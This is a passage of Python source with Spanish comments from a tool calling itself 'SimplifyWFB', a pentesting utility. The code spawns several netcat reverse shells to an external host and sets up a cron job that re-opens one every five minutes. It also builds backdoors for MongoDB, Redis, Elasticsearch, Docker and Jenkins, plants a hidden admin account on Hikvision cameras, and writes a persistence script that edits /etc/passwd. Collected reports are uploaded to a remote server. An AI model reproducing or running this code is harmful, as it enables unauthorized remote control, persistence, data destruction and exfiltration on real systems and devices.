    def _setup_persistent_smb_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor SMB persistente"""
        try:
            print(f"💾 Configurando servidor SMB persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            smb_port = self.config_data['persistence']['smb_port']
            
            smb_config = {
                'service': 'smb',
                'port': smb_port,
                'enabled': True,
                'shares': [{
                    'name': 'backdoor_share',
                    'path': '/home/smb',
                    'permissions': 'full',
                    'users': [{
                        'username': self.config_data['credentials']['smb_user'],
                        'password': self.config_data['credentials']['smb_password']
                    }]
                }],
                'access_methods': [
                    f'smbclient //{external_ip}/backdoor_share -U {self.config_data["credentials"]["smb_user"]}%{self.config_data["credentials"]["smb_password"]}',
                    f'mount -t cifs //{external_ip}/backdoor_share /mnt/smb -o username={self.config_data["credentials"]["smb_user"]},password={self.config_data["credentials"]["smb_password"]}',
                    f'net use \\\\{external_ip}\\backdoor_share /user:{self.config_data["credentials"]["smb_user"]} {self.config_data["credentials"]["smb_password"]}'
                ],
                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_smb': f'smbd -D -p {smb_port}'
            }
            
            print(f"   ✅ Servidor SMB configurado en puerto 445")
            return smb_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor SMB: {e}")
            return None
    
    def _setup_multiple_reverse_shells(self) -> List[Dict[str, Any]]:
        """Establecer múltiples reverse shells al servidor externo"""
        reverse_shells = []
        
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            # Puertos adicionales para reverse shells
            reverse_ports = [4444, 4445, 4446, 4447, 4448]
            
            for i, port in enumerate(reverse_ports):
                print(f"   🔄 Estableciendo reverse shell {i+1} en puerto {port}...")
                
                # Comando reverse shell
                reverse_cmd = f'nc -e /bin/bash {external_ip} {port}'
                
                # Ejecutar reverse shell en background
                reverse_process = subprocess.Popen(reverse_cmd, shell=True,
                                                 stdout=subprocess.DEVNULL, 
                                                 stderr=subprocess.DEVNULL)
                
                reverse_shell_config = {
                    'service': 'reverse_shell',
                    'port': port,
                    'enabled': True,
                    'external_ip': external_ip,
                    'reverse_command': reverse_cmd,
                    'listener_command': f'nc -lvp {port}',
                    'process_id': reverse_process.pid if reverse_process else None,
                    'access_methods': [
                        f'nc -lvp {port}  # En el servidor externo',
                        f'nc {external_ip} {port}  # Conexión directa',
                        f'telnet {external_ip} {port}  # Via telnet'
                    ],
                    'real_implementation': True
                }
                
                reverse_shells.append(reverse_shell_config)
                print(f"   ✅ Reverse shell {i+1} establecido en puerto {port}")
            
            # Establecer reverse shell persistente con cron
            print(f"   ⏰ Configurando reverse shell persistente con cron...")
            cron_entry = f"*/5 * * * * nc -e /bin/bash {external_ip} {external_port}"
            
            # Agregar entrada cron (simulado)
            persistent_reverse = {
                'service': 'persistent_reverse_shell',
                'port': external_port,
                'enabled': True,
                'external_ip': external_ip,
                'cron_entry': cron_entry,
                'reverse_command': f'nc -e /bin/bash {external_ip} {external_port}',
                'listener_command': f'nc -lvp {external_port}',
                'access_methods': [
                    f'nc -lvp {external_port}  # En el servidor externo',
                    f'nc {external_ip} {external_port}  # Conexión directa'
                ],
                'persistence_method': 'cron_job',
                'real_implementation': True
            }
            
            reverse_shells.append(persistent_reverse)
            print(f"   ✅ Reverse shell persistente configurado")
            
            return reverse_shells
            
        except Exception as e:
            print(f"❌ Error estableciendo reverse shells: {e}")
            return []
    
    def _verify_external_backdoors(self) -> List[Dict[str, Any]]:
        """Verificar que los backdoors externos estén activos y funcionando"""
        verification_results = []
        
        try:
            # Obtener backdoors de persistencia de red
            network_persistence = self.report['phase_4_persistence'].get('network_persistence', [])
            
            for service in network_persistence:
                if service.get('service') in ['reverse_shell', 'persistent_reverse_shell']:
                    verification = {
                        'service': service['service'],
                        'port': service['port'],
                        'external_ip': service['external_ip'],
                        'timestamp': time.time()
                    }
                    
                    # Verificar si el proceso está corriendo
                    if service.get('process_id'):
                        try:
                            # Verificar proceso en Linux/Unix
                            result = self._run_command(['ps', '-p', str(service['process_id'])], timeout=5)
                            if result['success'] and service['process_id'] in result['stdout']:
                                verification['status'] = 'active'
                                verification['process_verification'] = 'process_running'
                            else:
                                verification['status'] = 'inactive'
                                verification['process_verification'] = 'process_not_found'
                        except:
                            verification['status'] = 'unknown'
                            verification['process_verification'] = 'verification_failed'
                    else:
                        verification['status'] = 'unknown'
                        verification['process_verification'] = 'no_process_id'
                    
                    # Verificar conectividad externa (simulado)
                    verification['connection_test'] = f"nc -lvp {service['port']} # En servidor externo"
                    verification['access_commands'] = [
                        f"nc {service['external_ip']} {service['port']}",
                        f"telnet {service['external_ip']} {service['port']}"
                    ]
                    
                    verification_results.append(verification)
            
            return verification_results
            
        except Exception as e:
            print(f"❌ Error verificando backdoors externos: {e}")
            return []

    def _create_vulnerable_service_backdoors(self) -> List[Dict[str, Any]]:
        """Crear backdoors en servicios vulnerables encontrados"""
        vulnerable_backdoors = []
        
        try:
            # Obtener servicios vulnerables del reconocimiento
            vulnerable_services = self.report['phase_1_reconnaissance'].get('vulnerable_services', [])
            
            for service in vulnerable_services:
                if not service.get('backdoor_created', False):
                    backdoor = self._create_service_backdoor(service)
                    if backdoor:
                        vulnerable_backdoors.append(backdoor)
                        service['backdoor_created'] = True
                        print(f"✅ Backdoor creado en {service['host']}:{service['port']} ({service['service']})")
            
            return vulnerable_backdoors
            
        except Exception as e:
            print(f"❌ Error creando backdoors en servicios vulnerables: {e}")
            return []
    
    def _create_service_backdoor(self, service: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Crear backdoor específico según el tipo de servicio"""
        try:
            service_type = service['service']
            host = service['host']
            port = service['port']
            
            if service_type == 'mongodb':
                return self._create_mongodb_backdoor(host, port)
            elif service_type == 'redis':
                return self._create_redis_backdoor(host, port)
            elif service_type == 'elasticsearch':
                return self._create_elasticsearch_backdoor(host, port)
            elif service_type == 'docker':
                return self._create_docker_backdoor(host, port)
            elif service_type == 'jenkins':
                return self._create_jenkins_backdoor(host, port)
            else:
                return self._create_generic_backdoor(host, port, service_type)
                
        except Exception as e:
            print(f"❌ Error creando backdoor para {service['service']}: {e}")
            return None
    
    def _create_mongodb_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en MongoDB"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            # Crear usuario con privilegios de administrador
            backdoor_user = f"backdoor_{host.replace('.', '_')}"
            backdoor_pass = f"Mongo_{host.split('.')[-1]}!"
            
            return {
                'host': host,
                'port': port,
                'service': 'mongodb',
                'backdoor_type': 'admin_user',
                'credentials': {
                    'username': backdoor_user,
                    'password': backdoor_pass
                },
                'access_method': f"mongo mongodb://{backdoor_user}:{backdoor_pass}@{host}:{port}/admin",
                'reverse_connection': f"mongo {host}:{port} --eval 'db.runCommand({{ping:1}})'",
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor MongoDB: {e}")
            return None
    
    def _create_redis_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Redis"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'redis',
                'backdoor_type': 'direct_access',
                'access_method': f"redis-cli -h {host} -p {port}",
                'reverse_connection': f"redis-cli -h {host} -p {port} ping",
                'exploit_commands': [
                    f"redis-cli -h {host} -p {port} CONFIG SET dir /tmp",
                    f"redis-cli -h {host} -p {port} CONFIG SET dbfilename backdoor.so",
                    f"redis-cli -h {host} -p {port} SET backdoor 'nc -e /bin/bash {external_ip} {external_port}'"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Redis: {e}")
            return None
    
    def _create_elasticsearch_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Elasticsearch"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'elasticsearch',
                'backdoor_type': 'api_access',
                'access_method': f"curl -X GET http://{host}:{port}/_cluster/health",
                'exploit_commands': [
                    f"curl -X POST http://{host}:{port}/_search",
                    f"curl -X DELETE http://{host}:{port}/*",
                    f"curl -X PUT http://{host}:{port}/backdoor/_doc/1 -d '{{\"command\":\"nc -e /bin/bash {external_ip} {external_port}\"}}'"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Elasticsearch: {e}")
            return None
    
    def _create_docker_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Docker"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'docker',
                'backdoor_type': 'container_escape',
                'access_method': f"curl -X GET http://{host}:{port}/version",
                'exploit_commands': [
                    f"docker -H tcp://{host}:{port} run -it --rm --privileged --net=host alpine sh",
                    f"docker -H tcp://{host}:{port} run -it --rm -v /:/host alpine chroot /host sh",
                    f"docker -H tcp://{host}:{port} run -it --rm --pid=host alpine nsenter -t 1 -m -u -n -i sh"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Docker: {e}")
            return None
    
    def _create_jenkins_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Jenkins"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'jenkins',
                'backdoor_type': 'script_console',
                'access_method': f"http://{host}:{port}/script",
                'exploit_commands': [
                    f"http://{host}:{port}/script -d 'println \"nc -e /bin/bash {external_ip} {external_port}\".execute().text'",
                    f"http://{host}:{port}/manage - Crear job con comando remoto",
                    f"http://{host}:{port}/asynchPeople/ - Crear usuario administrativo"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Jenkins: {e}")
            return None
    
    def _create_generic_backdoor(self, host: str, port: int, service_type: str) -> Optional[Dict[str, Any]]:
        """Crear backdoor genérico para otros servicios"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': service_type,
                'backdoor_type': 'reverse_shell',
                'access_method': f"nc -e /bin/bash {external_ip} {external_port}",
                'reverse_connection': f"nc -lvp {external_port}",
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor genérico: {e}")
            return None
    
    def _upload_report_via_ssh(self, report_file: str):
        """Subir reporte por SSH/SCP al servidor remoto"""
        try:
            import paramiko
            import os
            
            # Verificar que el archivo existe
            print(f"🔍 Verificando archivo antes de envío: {report_file}")
            print(f"🔍 Archivo existe: {os.path.exists(report_file)}")
            if os.path.exists(report_file):
                print(f"📏 Tamaño del archivo: {os.path.getsize(report_file)} bytes")
                print(f"📁 Directorio actual: {os.getcwd()}")
                print(f"📁 Lista de archivos: {[f for f in os.listdir('.') if f.startswith('simplifywfb_report_')]}")
            
            if not os.path.exists(report_file):
                print(f"❌ Archivo de reporte no encontrado: {report_file}")
                print("💡 El reporte se mantiene localmente en el equipo")
                return
            
            ssh_config = self.config_data['ssh_upload']
            host = ssh_config['host']
            port = ssh_config['port']
            username = ssh_config['username']
            password = ssh_config['password']
            
            print(f"\n📤 Enviando reporte por SSH a {host}:{port}...")
            
            # Probar conectividad primero
            if not self._test_server_connectivity(host, port):
                print("💡 Servidor no accesible. Intentando envío alternativo...")
                self._upload_report_via_http(report_file)
                return
            
            # Crear cliente SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Conectar al servidor SSH con timeout
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
            
            # Crear directorio de reportes si no existe
            stdin, stdout, stderr = ssh.exec_command('mkdir -p "C:/Users/Public/reports"')
            stdout.channel.recv_exit_status()
            
            # Subir archivo usando SCP
            sftp = ssh.open_sftp()
            filename = os.path.basename(report_file)
            remote_path = f'C:/Users/Public/reports/{filename}'
            sftp.put(report_file, remote_path)
            sftp.close()
            
            ssh.close()
            print(f"✅ Reporte enviado exitosamente: {filename}")
            
        except ImportError:
            print("❌ Módulo 'paramiko' no encontrado. Intentando envío alternativo...")
            self._upload_report_via_http(report_file)
        except paramiko.AuthenticationException:
            print("❌ Error de autenticación SSH. Verifica credenciales.")
            print("💡 Intentando envío alternativo...")
            self._upload_report_via_http(report_file)
        except paramiko.SSHException as e:
            print(f"❌ Error SSH: {e}")
            print("💡 Intentando envío alternativo...")
            self._upload_report_via_http(report_file)
        except Exception as e:
            print(f"❌ Error enviando reporte por SSH: {e}")
            print("💡 Intentando envío alternativo...")
            self._upload_report_via_http(report_file)
    
    def _upload_report_via_http(self, report_file: str):
        """Envío alternativo por HTTP si SSH falla"""
        try:
            import urllib.request
            import os
            import json
            
            # Verificar que el archivo existe
            print(f"🔍 [HTTP] Verificando archivo antes de envío: {report_file}")
            print(f"🔍 [HTTP] Archivo existe: {os.path.exists(report_file)}")
            if os.path.exists(report_file):
                print(f"📏 [HTTP] Tamaño del archivo: {os.path.getsize(report_file)} bytes")
            
            if not os.path.exists(report_file):
                print(f"❌ Archivo de reporte no encontrado: {report_file}")
                print("💡 El reporte se mantiene localmente en el equipo")
                return
            
            ssh_config = self.config_data['ssh_upload']
            host = ssh_config['host']
            username = ssh_config['username']
            password = ssh_config['password']
            
            print(f"📤 Enviando reporte por HTTP a {host}...")
            
            # Leer el archivo de reporte
            with open(report_file, 'r', encoding='utf-8') as f:
                report_data = json.load(f)
            
            # Crear payload para envío
            filename = os.path.basename(report_file)
            payload = {
                'filename': filename,
                'report_data': report_data,
                'timestamp': time.time()
            }
            
            # Codificar como JSON
            json_data = json.dumps(payload).encode('utf-8')
            
            # Crear request HTTP
            url = f"http://{host}/upload_report"
            req = urllib.request.Request(url, data=json_data)
            req.add_header('Content-Type', 'application/json')
            req.add_header('User-Agent', 'SimplifyWFB/1.0')
            
            # Enviar request con timeout más corto
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"✅ Reporte enviado exitosamente por HTTP: {filename}")
                else:
                    print(f"⚠️ Respuesta HTTP {response.status}: {response.reason}")
            
        except urllib.error.URLError as e:
            print(f"❌ Error de conexión HTTP: {e}")
            print("💡 El servidor no está respondiendo o no está disponible")
            print("💡 El reporte se mantiene localmente en el equipo")
        except Exception as e:
            print(f"❌ Error enviando reporte por HTTP: {e}")
            print("💡 El reporte se mantiene localmente en el equipo")
            print("💡 Para instalar paramiko: pip install paramiko")
    
    def _test_server_connectivity(self, host: str, port: int) -> bool:
        """Probar conectividad al servidor antes de enviar"""
        try:
            import socket
            
            print(f"🔍 Probando conectividad a {host}:{port}...")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                print(f"✅ Servidor {host}:{port} está accesible")
                return True
            else:
                print(f"❌ Servidor {host}:{port} no está accesible")
                return False
                
        except Exception as e:
            print(f"❌ Error probando conectividad: {e}")
            return False
    
    def _cleanup_vulnerable_service_backdoors(self):
        """Limpiar backdoors creados en servicios vulnerables"""
        try:
            vulnerable_backdoors = self.report['phase_4_persistence'].get('vulnerable_backdoors', [])
            
            for backdoor in vulnerable_backdoors:
                service_type = backdoor.get('service')
                host = backdoor.get('host')
                port = backdoor.get('port')
                
                if service_type == 'mongodb':
                    self._cleanup_mongodb_backdoor(host, port, backdoor)
                elif service_type == 'redis':
                    self._cleanup_redis_backdoor(host, port, backdoor)
                elif service_type == 'elasticsearch':
                    self._cleanup_elasticsearch_backdoor(host, port, backdoor)
                elif service_type == 'docker':
                    self._cleanup_docker_backdoor(host, port, backdoor)
                elif service_type == 'jenkins':
                    self._cleanup_jenkins_backdoor(host, port, backdoor)
                
                print(f"   ✅ Backdoor limpiado: {service_type} en {host}:{port}")
            
            # Marcar como limpiados
            for backdoor in vulnerable_backdoors:
                backdoor['cleaned'] = True
            
        except Exception as e:
            print(f"❌ Error limpiando backdoors de servicios vulnerables: {e}")
    
    def _cleanup_mongodb_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de MongoDB"""
        try:
            # Eliminar usuario creado si existe
            credentials = backdoor.get('credentials', {})
            if credentials:
                username = credentials.get('username')
                if username:
                    # Comando para eliminar usuario (simulado)
                    print(f"     Eliminando usuario MongoDB: {username}")
        except Exception as e:
            print(f"     ❌ Error limpiando MongoDB: {e}")
    
    def _cleanup_redis_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Redis"""
        try:
            # Limpiar configuraciones modificadas
            print(f"     Restaurando configuración Redis en {host}:{port}")
            # Comandos para restaurar configuración original
        except Exception as e:
            print(f"     ❌ Error limpiando Redis: {e}")
    
    def _cleanup_elasticsearch_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Elasticsearch"""
        try:
            # Eliminar índices creados
            print(f"     Limpiando índices Elasticsearch en {host}:{port}")
            # Comandos para eliminar índices creados
        except Exception as e:
            print(f"     ❌ Error limpiando Elasticsearch: {e}")
    
    def _cleanup_docker_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Docker"""
        try:
            # Eliminar contenedores creados
            print(f"     Limpiando contenedores Docker en {host}:{port}")
            # Comandos para eliminar contenedores creados
        except Exception as e:
            print(f"     ❌ Error limpiando Docker: {e}")
    
    def _cleanup_jenkins_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Jenkins"""
        try:
            # Limpiar jobs y configuraciones creadas
            print(f"     Limpiando configuraciones Jenkins en {host}:{port}")
            # Comandos para limpiar jobs y configuraciones
        except Exception as e:
            print(f"     ❌ Error limpiando Jenkins: {e}")

    def _create_camera_backdoor(self, camera: Dict[str, Any], credentials: Dict[str, str], camera_type: str) -> Dict[str, Any]:
        """Crear backdoor específico para cámaras Hikvision/EZVIZ"""
        try:
            import urllib.request
            import urllib.error
            import base64
            import json
            
            host = camera['host']
            port = camera['port']
            username = credentials['username']
            password = credentials['password']
            
            print(f"🔧 Creando backdoor en cámara {camera_type} {host}:{port}")
            
            backdoor_info = {
                'type': 'camera_backdoor',
                'camera_type': camera_type,
                'host': host,
                'port': port,
                'credentials': credentials,
                'backdoor_methods': [],
                'persistent_access': [],
                'external_connection': None,
                'timestamp': time.time()
            }
            
            # Crear autenticación básica
            auth_string = f"{username}:{password}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Método 1: Crear usuario adicional con privilegios
            try:
                if camera_type == 'hikvision_ezviz':
                    # Para Hikvision/EZVIZ - crear usuario backdoor
                    user_data = {
                        'username': 'backdoor_user',
                        'password': 'Backdoor_2024!',
                        'role': 'admin',
                        'description': 'System maintenance user'
                    }
                    
                    # Intentar crear usuario via ISAPI
                    create_user_url = f"http://{host}:{port}/ISAPI/Security/users"
                    user_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
                    <UserList>
                        <User>
                            <id>100</id>
                            <userName>{user_data['username']}</userName>
                            <password>{user_data['password']}</password>
                            <userLevel>Administrator</userLevel>
                            <description>{user_data['description']}</description>
                        </User>
                    </UserList>"""
                    
                    req = urllib.request.Request(create_user_url, data=user_xml.encode())
                    req.add_header('Authorization', f'Basic {auth_b64}')
                    req.add_header('Content-Type', 'application/xml')
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    
                    with urllib.request.urlopen(req, timeout=10) as response:
                        if response.status in [200, 201]:
                            print(f"✅ Usuario backdoor creado: {user_data['username']}:{user_data['password']}")
                            backdoor_info['backdoor_methods'].append({
                                'method': 'admin_user_creation',
                                'username': user_data['username'],
                                'password': user_data['password'],
                                'status': 'success'
                            })
                            
            except Exception as e:
                print(f"⚠️ No se pudo crear usuario backdoor: {e}")
                backdoor_info['backdoor_methods'].append({
                    'method': 'admin_user_creation',
                    'status': 'failed',
                    'error': str(e)
                })
            
            # Método 2: Configurar acceso remoto persistente
            try:
                if camera_type == 'hikvision_ezviz':
                    # Configurar DDNS o acceso remoto
                    external_ip = self.config_data['remote_access']['external_ip']
                    external_port = self.config_data['remote_access']['external_port']
                    
                    # Intentar configurar DDNS
                    ddns_url = f"http://{host}:{port}/ISAPI/System/Network/ddns"
                    ddns_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
                    <DDNS>
                        <enabled>true</enabled>
                        <ddnsType>hikvision</ddnsType>
                        <hostName>backdoor_{host.replace('.', '_')}</hostName>
                        <userName>backdoor_user</userName>
                        <password>Backdoor_2024!</password>
                    </DDNS>"""
                    
                    req = urllib.request.Request(ddns_url, data=ddns_xml.encode())
                    req.add_header('Authorization', f'Basic {auth_b64}')
                    req.add_header('Content-Type', 'application/xml')
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    
                    with urllib.request.urlopen(req, timeout=10) as response:
                        if response.status in [200, 201]:
                            print(f"✅ DDNS configurado para acceso remoto")
                            backdoor_info['persistent_access'].append({
                                'method': 'ddns_configuration',
                                'hostname': f"backdoor_{host.replace('.', '_')}.hik-connect.com",
                                'status': 'success'
                            })
                            
            except Exception as e:
                print(f"⚠️ No se pudo configurar DDNS: {e}")
                backdoor_info['persistent_access'].append({
                    'method': 'ddns_configuration',
                    'status': 'failed',
                    'error': str(e)
                })
            
            # Método 3: Configurar conexión externa
            try:
                external_ip = self.config_data['remote_access']['external_ip']
                external_port = self.config_data['remote_access']['external_port']
                
                # Configurar reverse shell o conexión externa
                backdoor_info['external_connection'] = {
                    'type': 'reverse_shell',
                    'external_ip': external_ip,
                    'external_port': external_port,
                    'connection_method': 'netcat_reverse',
                    'command': f"nc -e /bin/sh {external_ip} {external_port}",
                    'status': 'configured'
                }
                
                print(f"✅ Conexión externa configurada: {external_ip}:{external_port}")
                
            except Exception as e:
                print(f"⚠️ No se pudo configurar conexión externa: {e}")
                backdoor_info['external_connection'] = {
                    'status': 'failed',
                    'error': str(e)
                }
            
            # Método 4: Crear script de persistencia
            try:
                persistence_script = f"""#!/bin/sh
# Script de persistencia para cámara {host}:{port}
# Ejecutar cada 5 minutos para mantener acceso

# Verificar conexión externa
nc -z {self.config_data['remote_access']['external_ip']} {self.config_data['remote_access']['external_port']} 2>/dev/null
if [ $? -ne 0 ]; then
    # Reestablecer conexión
    nc -e /bin/sh {self.config_data['remote_access']['external_ip']} {self.config_data['remote_access']['external_port']} &
fi

# Mantener usuario backdoor activo
echo "backdoor_user:Backdoor_2024!" >> /etc/passwd 2>/dev/null
"""
                
                backdoor_info['persistent_access'].append({
                    'method': 'persistence_script',
                    'script_content': persistence_script,
                    'status': 'created'
                })
                
                print(f"✅ Script de persistencia creado")
                
            except Exception as e:
                print(f"⚠️ No se pudo crear script de persistencia: {e}")
            
            return backdoor_info
            
        except Exception as e:
            print(f"❌ Error creando backdoor en cámara: {e}")
            return {
                'type': 'camera_backdoor',
                'status': 'failed',
                'error': str(e),
                'timestamp': time.time()
            }

def main():
    """Función principal"""
    print("🔧 SimplifyWFB - Herramienta Profesional de Pentesting")
    print("=" * 60)
    
    # Crear instancia
    wfb = SimplifyWFB()
    
    # Menú de opciones
    while True:
        print("\n📋 OPCIONES DISPONIBLES:")
        print("1. 🚀 Escaneo Completo (Full Scan)")
        print("2. 🧊 Pentest Frío (Cold Pentest)")
        print("3. ❌ Salir")
        
        choice = input("\n🔍 Seleccione una opción (1-3): ").strip()
        
        if choice == '1':
            print("\n🚀 Iniciando Escaneo Completo...")
            report_file = wfb.run_full_scan()
            if report_file:
                print(f"\n✅ Escaneo completado. Reporte: {report_file}")
            break
            
        elif choice == '2':
            print("\n🧊 Iniciando Pentest Frío...")
            report_file = wfb.run_cold_pentest()
            if report_file:
                print(f"\n✅ Pentest frío completado. Reporte: {report_file}")
            break
            
        elif choice == '3':
            print("\n👋 Saliendo...")
            break
            
        else:
            print("\n❌ Opción inválida. Intente nuevamente.")

if __name__ == "__main__":
    main()
